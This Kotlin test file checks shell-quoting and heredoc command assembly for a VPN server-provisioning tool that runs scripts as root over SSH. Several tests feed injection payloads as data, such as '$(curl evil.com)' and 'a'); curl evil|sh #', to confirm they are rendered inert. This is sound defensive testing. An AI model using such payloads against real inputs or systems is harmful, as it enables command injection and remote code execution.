package vpn.core

import java.io.File
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertTrue
import kotlin.test.fail

/**
 * Pins the two pure command-assembly seams of the provisioning path.
 *
 * [SshService.shQuote] is the ONLY break-out guard between attacker-influence-
 * able strings (the server IP, and awgVersion parsed from REMOTE scan output
 * — see the doc comment on shQuote) and a root shell on every provisioned
 * VPS. Its comment records a past incident where an unescaped sibling arg
 * containing `'` escaped the quoting. Before this test nothing protected it
 * from a one-character regression.
 *
 * [SshService.provisionCommand] assembles the `bash -s` heredoc every
 * provision* function pipes through SSH; the marker must appear exactly
 * twice (open/close) and every argument must be single-quoted.
 */
class SshCommandTest {

    /**
     * The close-escape-reopen idiom shQuote emits for one input quote:
     * `'` `\` `'` `'` — end the single-quoted run, a shell-escaped literal
     * quote, start a new single-quoted run. Written as a composition so the
     * assertions below never bury a quote run inside a string literal where
     * a stray `'` is invisible to the reader.
     */
    private val esc = "'\\''"

    /** Exact POSIX shape: `'` + body-with-each-quote-replaced-by-esc + `'`. */
    private fun quoted(body: String): String {
        val sb = StringBuilder("'")
        for (c in body) {
            if (c == '\'') sb.append(esc) else sb.append(c)
        }
        return sb.append('\'').toString()
    }

    // ---- shQuote: exact outputs ----

    @Test
    fun `shQuote plain value`() {
        assertEquals("'1.2.3.4'", SshService.shQuote("1.2.3.4"))
    }

    @Test
    fun `shQuote embedded single quotes`() {
        assertEquals(quoted("a'b"), SshService.shQuote("a'b"))
        assertEquals("''\\'''", SshService.shQuote("'"))
        assertEquals(quoted("it's done"), SshService.shQuote("it's done"))
        assertEquals(quoted("'"), SshService.shQuote("'"))
        assertEquals(quoted("''"), SshService.shQuote("''"))
        // Spell one expectation out fully literally as a cross-check of the
        // composition helper itself: 'a'\''b'
        assertEquals("'a'\\''b'", SshService.shQuote("a'b"))
    }

    @Test
    fun `shQuote double quote needs no special treatment inside single quotes`() {
        assertEquals("'say \"hi\"'", SshService.shQuote("say \"hi\""))
    }

    @Test
    fun `shQuote neutralises dollar backtick and shell metacharacters`() {
        // Inside '...' the shell takes everything literally — the value must
        // come out byte-preserved between the outer quotes.
        assertEquals("'\$HOME `id` a|b;c&D>x<y'", SshService.shQuote("\$HOME `id` a|b;c&D>x<y"))
        assertEquals("'$(curl evil.com)'", SshService.shQuote("\$(curl evil.com)"))
        assertEquals("'`id`'", SshService.shQuote("`id`"))
    }

    @Test
    fun `shQuote spaces and whitespace`() {
        assertEquals("'a b'", SshService.shQuote("a b"))
        assertEquals("' '", SshService.shQuote(" "))
        assertEquals("'\t'", SshService.shQuote("\t"))
        assertEquals("'\n'", SshService.shQuote("\n"))
        assertEquals("''", SshService.shQuote(""))
    }

    @Test
    fun `shQuote result always starts and ends with a single quote`() {
        val probes = listOf("", " ", "'", "''", "\\", "\\\\", "'\\", "a'b'c", "\n", "\r\n", "\$x")
        for (p in probes) {
            val q = SshService.shQuote(p)
            assertTrue(q.length >= 2, "too short: $q")
            assertTrue(q.startsWith("'") && q.endsWith("'"), "not quoted: $q")
        }
    }

    @Test
    fun `shQuote adversarial break-out attempt is fully quoted`() {
        // The historical incident class: a remote-derived value like this
        // must be rendered inert. Expected literal composed by hand from the
        // replace rule (' -> '\''), no clever regex:
        val payload = "a'); curl evil|sh #"
        val expected = "'" + "a" + esc + "); curl evil|sh #" + "'"
        assertEquals(expected, SshService.shQuote(payload))
        assertEquals("'a'\\''); curl evil|sh #'", SshService.shQuote(payload))
        // Structural check: strip the outer quotes, then every '\'' idiom;
        // no bare quote may survive, or the payload could close the quoting.
        val inner = SshService.shQuote(payload).removePrefix("'").removeSuffix("'")
        val withoutIdioms = inner.replace(esc, "")
        assertEquals(-1, withoutIdioms.indexOf("'"), "unescaped quote survived: $withoutIdioms")
    }

    @Test
    fun `shQuote matches the literal replace rule on quote-dense inputs`() {
        val inputs = listOf("x", "'", "''", "'''", "a'b'c'd", "\\';x", "'\\''", "a\\\\'b")
        for (i in inputs) {
            assertEquals("'" + i.replace("'", "'\\''") + "'", SshService.shQuote(i))
        }
    }

    // ---- provisionCommand: heredoc assembly ----

    private val openMarker = "<<'__VPN_SETUP_SCRIPT__'"
    private val closeMarker = "__VPN_SETUP_SCRIPT__"

    @Test
    fun `provisionCommand runs as root without sudo`() {
        val cmd = SshService.provisionCommand("SCRIPT", asRoot = true, "1.2.3.4")
        assertEquals("bash -s -- '1.2.3.4' $openMarker\nSCRIPT\n$closeMarker", cmd)
    }

    @Test
    fun `provisionCommand adds sudo prefix for non-root`() {
        val cmd = SshService.provisionCommand("SCRIPT", asRoot = false, "1.2.3.4")
        assertEquals("sudo bash -s -- '1.2.3.4' $openMarker\nSCRIPT\n$closeMarker", cmd)
    }

    @Test
    fun `provisionCommand quotes every argument`() {
        val cmd = SshService.provisionCommand(
            "S", asRoot = true, "203.0.113.9", "amnezia", "v'1.0.11",
        )
        assertTrue(
            cmd.contains("-- " + quoted("203.0.113.9") + " " + quoted("amnezia") + " " + quoted("v'1.0.11")),
            cmd,
        )
    }

    @Test
    fun `provisionCommand omits the dash-dash when there are no arguments`() {
        // scan-tunnels shape: `bash -s <<'...'` with no `--`.
        assertEquals("bash -s $openMarker\nS\n$closeMarker", SshService.provisionCommand("S", asRoot = true))
        assertEquals(
            "sudo bash -s $openMarker\nS\n$closeMarker",
            SshService.provisionCommand("S", asRoot = false),
        )
    }

    @Test
    fun `provisionCommand carries the heredoc marker exactly twice and script verbatim between`() {
        val script = "echo hi\necho 'there' >> __VPN_DONE__"
        val cmd = SshService.provisionCommand(script, asRoot = true, "1.1.1.1")
        assertEquals(2, countOccurrences(cmd, closeMarker))
        // Open marker ends with the quoted terminator, close is bare at the tail.
        assertTrue(cmd.contains(openMarker), cmd)
        assertTrue(cmd.endsWith("\n$closeMarker"), cmd)
        // The script sits verbatim between the marker lines.
        val start = cmd.indexOf(openMarker) + openMarker.length + 1
        val end = cmd.lastIndexOf("\n$closeMarker")
        assertEquals(script, cmd.substring(start, end))
    }

    // ---- marker integrity: a script containing the terminator would cut the
    // heredoc short and hand the remainder to the root shell ----

    private fun repoRoot(): File {
        var dir = File(".").absoluteFile
        while (dir.parentFile != null) {
            if (File(dir, "desktop").isDirectory && File(dir, "server").isDirectory) return dir
            dir = dir.parentFile
        }
        fail("could not locate repo root (dir with desktop/ and server/) from ${File(".").absolutePath}")
    }

    @Test
    fun `bundled setup scripts never contain the heredoc terminator marker`() {
        val names = listOf(
            "setup-xray.sh", "setup-ikev2.sh", "setup-openvpn.sh",
            "setup-wireguard.sh", "scan-tunnels.sh",
        )
        val resDir = File(repoRoot(), "desktop/src/main/resources")
        for (name in names) {
            val f = File(resDir, name)
            assertTrue(f.isFile, "missing bundled script ${f.absolutePath}")
            val text = f.readText(Charsets.UTF_8)
            assertTrue(
                !text.contains(closeMarker),
                "$name contains the heredoc terminator — provisioning would break mid-script",
            )
        }
    }
}

/** Non-overlapping occurrences of [needle] in [haystack]. */
private fun countOccurrences(haystack: String, needle: String): Int =
    Regex(Regex.escape(needle)).findAll(haystack).count()
